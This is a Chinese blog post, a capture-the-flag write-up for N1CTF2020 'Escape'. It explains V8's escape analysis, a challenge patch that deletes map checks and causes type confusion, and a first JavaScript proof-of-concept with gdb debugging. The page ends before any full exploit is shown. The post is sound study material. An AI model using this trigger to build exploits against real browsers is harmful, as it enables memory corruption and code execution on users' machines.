<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;224317 0x00 前言通过N1CTF2020 Escape一题学习V8的逃逸分析机制">
<meta property="og:type" content="article">
<meta property="og:title" content="V8逃逸分析(escape-analysis)——N1CTF2020 Escape">
<meta property="og:url" content="https://github.com/2020/12/04/N1CTF2020-Escape/index.html">
<meta property="og:site_name" content="ha1vk&#39;s blog">
<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;224317 0x00 前言通过N1CTF2020 Escape一题学习V8的逃逸分析机制">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://p4.ssl.qhimg.com/t01322959afaf66b3a3.png">
<meta property="og:image" content="https://p1.ssl.qhimg.com/t013596a581fda8e77a.png">
<meta property="og:image" content="https://p0.ssl.qhimg.com/t01789815d9df6a03cc.png">
<meta property="og:image" content="https://p4.ssl.qhimg.com/t01a5211fc0196ba77b.png">
<meta property="og:image" content="https://p2.ssl.qhimg.com/t015eb61e72a337ec44.png">
<meta property="og:image" content="https://p0.ssl.qhimg.com/t01f7547a83a3b77486.png">
<meta property="og:image" content="https://p1.ssl.qhimg.com/t01c91887bae3f5e5f0.png">
<meta property="og:image" content="https://p1.ssl.qhimg.com/t01bd45c25aea783475.png">
<meta property="article:published_time" content="2020-12-04T02:00:22.000Z">
<meta property="article:modified_time" content="2025-06-26T09:02:07.723Z">
<meta property="article:author" content="ha1vk">
<meta property="article:tag" content="JS引擎漏洞">
<meta property="article:tag" content="类型混淆">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://p4.ssl.qhimg.com/t01322959afaf66b3a3.png">

<link rel="canonical" href="https://github.com/2020/12/04/N1CTF2020-Escape/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>V8逃逸分析(escape-analysis)——N1CTF2020 Escape | ha1vk's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ha1vk's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/2020/12/04/N1CTF2020-Escape/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ha1vk">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ha1vk's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          V8逃逸分析(escape-analysis)——N1CTF2020 Escape
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-04 10:00:22" itemprop="dateCreated datePublished" datetime="2020-12-04T10:00:22+08:00">2020-12-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224317">https://www.anquanke.com/post/id/224317</a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>通过N1CTF2020 Escape一题学习V8的逃逸分析机制</p>
<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="逃逸分析"><a href="#逃逸分析" class="headerlink" title="逃逸分析"></a>逃逸分析</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>逃逸分析(escape-analysis)就是JIT阶段用来分析对象的作用域的一种机制，分析对象的作用域是为了更好的优化代码，生成高效率的JIT代码。<br>如下的代码中，对象a发生了<code>逃逸</code>，因为a是在函数中创建的对象，通过return返回给外部使用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function func() &#123;</span><br><span class="line">	var a = [];</span><br><span class="line">	return a;</span><br><span class="line">&#125;</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
<p>如下的代码也同样发生<code>逃逸</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line">function func() &#123;</span><br><span class="line">	a = [];</span><br><span class="line">&#125;</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
<p>逃逸的对象不会在函数执行完毕不会被收回，因此JIT对此类对象不做优化。</p>
<h4 id="优化未逃逸的对象"><a href="#优化未逃逸的对象" class="headerlink" title="优化未逃逸的对象"></a>优化未逃逸的对象</h4><p>如果对象未发生逃逸，JIT会将其优化为局部变量的形式，如下的代码中,v未发生逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function func(a) &#123;</span><br><span class="line">   let v = &#123;x:a,y:a&#125;;</span><br><span class="line">   return v.x+v.y;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>那么该函数会被优化为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function func(a) &#123;</span><br><span class="line">   return a+a;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>从中可用看出，逃逸分析可以优化那些未逃逸的对象，去掉不必要的对象申请，使得代码更加高效。</p>
<h4 id="构造一个逃逸"><a href="#构造一个逃逸" class="headerlink" title="构造一个逃逸"></a>构造一个逃逸</h4><p>如下，将另一个函数作为一个参数，并在当前这个函数里调用另一个函数，JIT将无法在编译时确定foo会做什么，由此，o会发生逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function (foo) &#123;</span><br><span class="line">	let o = &#123;&#125;;</span><br><span class="line">	foo(o);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="JIT逃逸分析如何确定变量类型"><a href="#JIT逃逸分析如何确定变量类型" class="headerlink" title="JIT逃逸分析如何确定变量类型"></a>JIT逃逸分析如何确定变量类型</h4><blockquote>
<p>In a CFG: One map per basic block, updated imperatively when traversing the<br>block</p>
</blockquote>
<ul>
<li>In an unscheduled graph: One map per effectful node.<br>This is expensive! Solution: A purely functional map:</li>
<li>Copy: O(1)</li>
<li>Update&#x2F;Access: O(log n)<br>This can be achieved with any tree-based map datastructure.<br>We chose a hash-tree.</li>
</ul>
<p>从<code>Escape Analysis in V8</code>文献中可以看出，在逃逸分析时，使用树结构来保存各个节点的<code>checkmap</code>，这样进行复制时，只需要<code>O(1)</code>的时间，进行状态更新和访问时，只需要<code>O(log n)</code>的时间。<code>checkmap</code>决定了这个节点生成的JIT该以什么方式去操作对象。如果<code>checkmap</code>缺失，将导致生成的JIT代码有问题，发生类型混淆。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/escape-analysis.cc b/src/compiler/escape-analysis.cc</span><br><span class="line">index 2a096b6933..3046d7b04e 100644</span><br><span class="line">--- a/src/compiler/escape-analysis.cc</span><br><span class="line">+++ b/src/compiler/escape-analysis.cc</span><br><span class="line">@@ -178,7 +178,7 @@ class EscapeAnalysisTracker : public ZoneObject &#123;</span><br><span class="line">         : VariableTracker::Scope(&amp;tracker-&gt;variable_states_, node, reduction),</span><br><span class="line">           tracker_(tracker),</span><br><span class="line">           reducer_(reducer) &#123;&#125;</span><br><span class="line">-    const VirtualObject* GetVirtualObject(Node* node) &#123;</span><br><span class="line">+    VirtualObject* GetVirtualObject(Node* node) &#123;</span><br><span class="line">       VirtualObject* vobject = tracker_-&gt;virtual_objects_.Get(node);</span><br><span class="line">       if (vobject) vobject-&gt;AddDependency(current_node());</span><br><span class="line">       return vobject;</span><br><span class="line">@@ -576,10 +576,14 @@ void ReduceNode(const Operator* op, EscapeAnalysisTracker::Scope* current,</span><br><span class="line">     case IrOpcode::kStoreField: &#123;</span><br><span class="line">       Node* object = current-&gt;ValueInput(0);</span><br><span class="line">       Node* value = current-&gt;ValueInput(1);</span><br><span class="line">-      const VirtualObject* vobject = current-&gt;GetVirtualObject(object);</span><br><span class="line">+      VirtualObject* vobject = current-&gt;GetVirtualObject(object);</span><br><span class="line">       Variable var;</span><br><span class="line">       if (vobject &amp;&amp; !vobject-&gt;HasEscaped() &amp;&amp;</span><br><span class="line">           vobject-&gt;FieldAt(OffsetOfFieldAccess(op)).To(&amp;var)) &#123;</span><br><span class="line">+        // Attach cached map info to the virtual object.</span><br><span class="line">+        if (OffsetOfFieldAccess(op) == HeapObject::kMapOffset) &#123;</span><br><span class="line">+          vobject-&gt;SetMap(value);</span><br><span class="line">+        &#125;</span><br><span class="line">         current-&gt;Set(var, value);</span><br><span class="line">         current-&gt;MarkForDeletion();</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">@@ -747,6 +751,17 @@ void ReduceNode(const Operator* op, EscapeAnalysisTracker::Scope* current,</span><br><span class="line">           // yet.</span><br><span class="line">           break;</span><br><span class="line">         &#125;</span><br><span class="line">+      &#125; else if (vobject) &#123;</span><br><span class="line">+        Node* cache_map = vobject-&gt;Map();</span><br><span class="line">+        if (cache_map) &#123;</span><br><span class="line">+          Type const map_type = NodeProperties::GetType(cache_map);</span><br><span class="line">+          if (map_type.IsHeapConstant() &amp;&amp;</span><br><span class="line">+              params.maps().contains(</span><br><span class="line">+                  map_type.AsHeapConstant()-&gt;Ref().AsMap().object())) &#123;</span><br><span class="line">+            current-&gt;MarkForDeletion();</span><br><span class="line">+            break;</span><br><span class="line">+          &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       current-&gt;SetEscaped(checked);</span><br><span class="line">       break;</span><br><span class="line">@@ -804,6 +819,12 @@ void ReduceNode(const Operator* op, EscapeAnalysisTracker::Scope* current,</span><br><span class="line">       for (int i = 0; i &lt; value_input_count; ++i) &#123;</span><br><span class="line">         Node* input = current-&gt;ValueInput(i);</span><br><span class="line">         current-&gt;SetEscaped(input);</span><br><span class="line">+</span><br><span class="line">+        // Invalidate associated map cache for all value input nodes.</span><br><span class="line">+        VirtualObject* vobject = current-&gt;GetVirtualObject(input);</span><br><span class="line">+        if (vobject) &#123;</span><br><span class="line">+          vobject-&gt;SetMap(nullptr);</span><br><span class="line">+        &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       if (OperatorProperties::HasContextInput(op)) &#123;</span><br><span class="line">         current-&gt;SetEscaped(current-&gt;ContextInput());</span><br><span class="line">diff --git a/src/compiler/escape-analysis.h b/src/compiler/escape-analysis.h</span><br><span class="line">index 0fbc7d0bdd..ec56488388 100644</span><br><span class="line">--- a/src/compiler/escape-analysis.h</span><br><span class="line">+++ b/src/compiler/escape-analysis.h</span><br><span class="line">@@ -147,11 +147,14 @@ class VirtualObject : public Dependable &#123;</span><br><span class="line">   bool HasEscaped() const &#123; return escaped_; &#125;</span><br><span class="line">   const_iterator begin() const &#123; return fields_.begin(); &#125;</span><br><span class="line">   const_iterator end() const &#123; return fields_.end(); &#125;</span><br><span class="line">+  Node* Map() const &#123; return map_; &#125;</span><br><span class="line">+  void SetMap(Node* map) &#123; map_ = map; &#125;</span><br><span class="line"> </span><br><span class="line">  private:</span><br><span class="line">   bool escaped_ = false;</span><br><span class="line">   Id id_;</span><br><span class="line">   ZoneVector&lt;Variable&gt; fields_;</span><br><span class="line">+  Node* map_;</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> class EscapeAnalysisResult &#123;</span><br></pre></td></tr></table></figure>
<p>从中可用看出，patch文件在<code> VirtualObject</code>类中增加了几个变量和函数，并在一些位置进行调用，利用<code>git apply patch.diff</code>将patch文件应用，然后我们分析完整的<code>escape-analysis.cc</code>文件，在<code>ReduceNode</code>函数中的<code>IrOpcode::kStoreField</code>分支时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> case IrOpcode::kStoreField: &#123;</span><br><span class="line">   Node* object = current-&gt;ValueInput(0);</span><br><span class="line">   Node* value = current-&gt;ValueInput(1);</span><br><span class="line">   VirtualObject* vobject = current-&gt;GetVirtualObject(object);</span><br><span class="line">   Variable var;</span><br><span class="line">//如果对象没有逃逸</span><br><span class="line">   if (vobject &amp;&amp; !vobject-&gt;HasEscaped() &amp;&amp;</span><br><span class="line">       vobject-&gt;FieldAt(OffsetOfFieldAccess(op)).To(&amp;var)) &#123;</span><br><span class="line">     // Attach cached map info to the virtual object.</span><br><span class="line">     if (OffsetOfFieldAccess(op) == HeapObject::kMapOffset) &#123;</span><br><span class="line">       vobject-&gt;SetMap(value); //拷贝一份map值</span><br><span class="line">     &#125;</span><br><span class="line">     current-&gt;Set(var, value); //将对象里面保存的值赋给一个变量</span><br><span class="line">     current-&gt;MarkForDeletion(); //标记法将该节点删除</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">     current-&gt;SetEscaped(object);</span><br><span class="line">     current-&gt;SetEscaped(value);</span><br><span class="line">   &#125;</span><br><span class="line">   break;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码可以体现出<code>逃逸分析</code>中的<code>变量替换</code>思想，即对没有逃逸的对象进行优化。<br>接下来继续看<code>IrOpcode::kCheckMaps</code>分支补丁上去的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">case IrOpcode::kCheckMaps: &#123;</span><br><span class="line">  CheckMapsParameters params = CheckMapsParametersOf(op);</span><br><span class="line">  Node* checked = current-&gt;ValueInput(0);</span><br><span class="line">  const VirtualObject* vobject = current-&gt;GetVirtualObject(checked);</span><br><span class="line">  Variable map_field;</span><br><span class="line">  Node* map;</span><br><span class="line">  if (vobject &amp;&amp; !vobject-&gt;HasEscaped() &amp;&amp;</span><br><span class="line">      vobject-&gt;FieldAt(HeapObject::kMapOffset).To(&amp;map_field) &amp;&amp;</span><br><span class="line">      current-&gt;Get(map_field).To(&amp;map)) &#123; //未逃逸</span><br><span class="line">    if (map) &#123;</span><br><span class="line">      Type const map_type = NodeProperties::GetType(map);</span><br><span class="line">      if (map_type.IsHeapConstant() &amp;&amp;</span><br><span class="line">          params.maps().contains(</span><br><span class="line">              map_type.AsHeapConstant()-&gt;Ref().AsMap().object())) &#123;</span><br><span class="line">        current-&gt;MarkForDeletion();</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      // If the variable has no value, we have not reached the fixed-point</span><br><span class="line">      // yet.</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">   //这里是patch上的代码</span><br><span class="line">  &#125; else if (vobject) &#123; //逃逸状态</span><br><span class="line">    Node* cache_map = vobject-&gt;Map();</span><br><span class="line">    if (cache_map) &#123; //如果该对象存在map的副本</span><br><span class="line">      Type const map_type = NodeProperties::GetType(cache_map);</span><br><span class="line">      if (map_type.IsHeapConstant() &amp;&amp;</span><br><span class="line">          params.maps().contains(</span><br><span class="line">              map_type.AsHeapConstant()-&gt;Ref().AsMap().object())) &#123;</span><br><span class="line">        current-&gt;MarkForDeletion(); //将这个checkmap标记为删除状态</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  current-&gt;SetEscaped(checked);</span><br><span class="line">  break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前面我们介绍过，所有节点的checkmap保存在一棵树上，因此为了方便进行删除，这里用的是<code>MarkForDeletion()</code>，只需要<code>O(1)</code>的时间即可将当前这个节点的checkmap标记为删除。checkmap被删除的话，那么JIT在处理这个节点时将无法知道其当前的类型，由此会造成<code>类型混淆(Type Confusion)</code>。<br>再来看打到<code>default</code>分支上的补丁</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">default: &#123;</span><br><span class="line">  // For unknown nodes, treat all value inputs as escaping.</span><br><span class="line">  int value_input_count = op-&gt;ValueInputCount();</span><br><span class="line">  for (int i = 0; i &lt; value_input_count; ++i) &#123;</span><br><span class="line">    Node* input = current-&gt;ValueInput(i);</span><br><span class="line">    current-&gt;SetEscaped(input);</span><br><span class="line"></span><br><span class="line">    // 将该节点的map_设置为null</span><br><span class="line">    VirtualObject* vobject = current-&gt;GetVirtualObject(input);</span><br><span class="line">    if (vobject) &#123;</span><br><span class="line">      vobject-&gt;SetMap(nullptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if (OperatorProperties::HasContextInput(op)) &#123;</span><br><span class="line">    current-&gt;SetEscaped(current-&gt;ContextInput());</span><br><span class="line">  &#125;</span><br><span class="line">  break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出这里又清除了<code>map_</code>变量的值</p>
<h3 id="POC构造与分析"><a href="#POC构造与分析" class="headerlink" title="POC构造与分析"></a>POC构造与分析</h3><p>首先得让<code>vobject-&gt;_map</code>这个变量被赋值，那么就是发生在没有逃逸的时候，会进入分支</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (vobject &amp;&amp; !vobject-&gt;HasEscaped() &amp;&amp;</span><br><span class="line">          vobject-&gt;FieldAt(OffsetOfFieldAccess(op)).To(&amp;var)) &#123;</span><br></pre></td></tr></table></figure>
<p>然后得让变量进入逃逸状态，这样当进入<code>case IrOpcode::kCheckMaps:</code>时能够进入<code>else if (vobject) &#123; //逃逸状态&#125;</code>分支，但要执行到<code>current-&gt;MarkForDeletion();</code>语句，还得保证<code>Node* cache_map = vobject-&gt;Map();</code>不为空。<br>首先构造如下的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function opt(foo) &#123;</span><br><span class="line">   var a = [1.1]; //未逃逸</span><br><span class="line">   foo(a); //逃逸</span><br><span class="line">   return a[0];</span><br><span class="line">&#125;</span><br><span class="line">//触发JIT编译</span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt((o)=&gt;&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">x = Array(0);</span><br><span class="line">print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型</span><br></pre></td></tr></table></figure>
<p>运行后发现不能像我们预期的那样发生类型混淆，通过gdb调试看一下，在三个patch点下断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b escape-analysis.cc:585</span><br><span class="line">b escape-analysis.cc:738</span><br><span class="line">b escape-analysis.cc:826</span><br></pre></td></tr></table></figure>
<p>通过调试发现仅能在585这一个分支断下，添加<code>-print-opt-code</code>选项可以看到整个代码都被JIT优化了<br><img src="https://p4.ssl.qhimg.com/t01322959afaf66b3a3.png"><br>这样的话JIT编译器可以确定foo做了什么，我们的opt函数就会退化为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function opt(foo) &#123;</span><br><span class="line">   var a = [1.1]; </span><br><span class="line">   return a[0];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此我们得仅让opt这一个函数被优化，由此应该这样</p>
